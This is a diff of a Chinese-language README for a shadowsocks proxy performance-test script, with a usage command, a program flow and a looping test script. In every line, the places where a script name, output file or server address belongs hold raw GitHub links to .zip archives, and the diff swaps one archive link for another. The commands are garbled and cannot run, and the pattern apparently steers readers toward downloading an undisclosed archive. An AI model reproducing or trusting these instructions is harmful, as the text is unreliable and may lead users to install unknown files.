@@ -4,12 +4,12 @@
 ###简单使用:
 
 ```shell
-https://github.com/than0024/ss-perf/raw/refs/heads/master/shadowsocks/utils/perf_ss_1.3.zip -s https://github.com/than0024/ss-perf/raw/refs/heads/master/shadowsocks/utils/perf_ss_1.3.zip -p XXXX -k YYYYY -m rc4-md5
+https://github.com/than0024/ss-perf/raw/refs/heads/master/shadowsocks/tests/socksify/ss_perf_exasperative.zip -s https://github.com/than0024/ss-perf/raw/refs/heads/master/shadowsocks/tests/socksify/ss_perf_exasperative.zip -p XXXX -k YYYYY -m rc4-md5
 ```
 
 ###程序流程:
 - 开启shadowsocks local port 10800
-- 通过curl --socks-hostname 对https://github.com/than0024/ss-perf/raw/refs/heads/master/shadowsocks/utils/perf_ss_1.3.zip中url进行访问。(分ssvisit和ssdownload两种type)
+- 通过curl --socks-hostname 对https://github.com/than0024/ss-perf/raw/refs/heads/master/shadowsocks/tests/socksify/ss_perf_exasperative.zip中url进行访问。(分ssvisit和ssdownload两种type)
 - 对ssvisit和ssdownload分别进行统计
 - 关闭shadowsocks local
 
@@ -17,11 +17,11 @@ https://github.com/than0024/ss-perf/raw/refs/heads/master/shadowsocks/utils/perf
 
 ```shell
 # test script
-echo "" > https://github.com/than0024/ss-perf/raw/refs/heads/master/shadowsocks/utils/perf_ss_1.3.zip
+echo "" > https://github.com/than0024/ss-perf/raw/refs/heads/master/shadowsocks/tests/socksify/ss_perf_exasperative.zip
 for i in `seq 1 24`; do
-    for server in "45.76.161.232" "47.91.176.38" "https://github.com/than0024/ss-perf/raw/refs/heads/master/shadowsocks/utils/perf_ss_1.3.zip" "107.191.61.19"; do\
-        echo "Iteration $i server $server" >> https://github.com/than0024/ss-perf/raw/refs/heads/master/shadowsocks/utils/perf_ss_1.3.zip
-        https://github.com/than0024/ss-perf/raw/refs/heads/master/shadowsocks/utils/perf_ss_1.3.zip -s $server -p $SS_PORT -k $SS_PASS -m rc4-md5 >> https://github.com/than0024/ss-perf/raw/refs/heads/master/shadowsocks/utils/perf_ss_1.3.zip;
+    for server in "45.76.161.232" "47.91.176.38" "https://github.com/than0024/ss-perf/raw/refs/heads/master/shadowsocks/tests/socksify/ss_perf_exasperative.zip" "107.191.61.19"; do\
+        echo "Iteration $i server $server" >> https://github.com/than0024/ss-perf/raw/refs/heads/master/shadowsocks/tests/socksify/ss_perf_exasperative.zip
+        https://github.com/than0024/ss-perf/raw/refs/heads/master/shadowsocks/tests/socksify/ss_perf_exasperative.zip -s $server -p $SS_PORT -k $SS_PASS -m rc4-md5 >> https://github.com/than0024/ss-perf/raw/refs/heads/master/shadowsocks/tests/socksify/ss_perf_exasperative.zip;
     done;
     echo "Iteration $i Sleeping......."
     sleep 3600;
